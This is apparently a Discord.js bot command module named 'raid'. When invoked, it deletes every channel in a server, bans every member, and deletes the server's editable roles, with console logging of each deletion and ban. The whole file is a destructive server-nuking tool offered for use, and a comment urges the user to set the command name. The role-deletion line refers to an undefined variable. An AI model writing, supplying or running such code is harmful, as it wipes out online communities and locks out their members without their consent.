const Discord = require("discord.js");
const chalk = require('chalk');
const config = require("../config.json")
const log = console.log;

module.exports.run = async (bot, message, args) => {
// if (!config.banMessage){
//     banMessage = "- yeeted -"
// }

  for (var i = 0; i < message.guild.channels.array().length; i++) {
    message.guild.channels.array()[i].delete();
    //log(chalk.red('[Channel]') + " Deleted channel #" + i)
    console.log(chalk.red("[Channel]") + " Deleted channel #" + i);
}

 for (var i = 0; i < message.guild.members.array().length; i++) {
  message.guild.members.array()[i].ban("eeeee");
  //log(chalk.red("[Banned]") + " Banned users #" + i);

    console.log(chalk.red("[Banned]") + " Banned users #" + i);
}

// let filter = role => role.id !== message.guild.roles.find('name', '@everyone').id && role.id !== message.guild.defaultRole.id;
//     setTimeout(function () {
//         let rolesToDelete = message.guild.roles.filter(filter);
//         rolesToDelete.deleteAll();
//     }, 45);


    message.guild.roles.filter((role) => !role.managed && role.editable && role.id !== guild.id).forEach((role) => {
        role.delete().catch((err) => {});
    });
}



module.exports.help = {
    name: "raid" // <<<<<<<<<<<<<<< PUT THE COMMAND NAME HERE NOOB
}
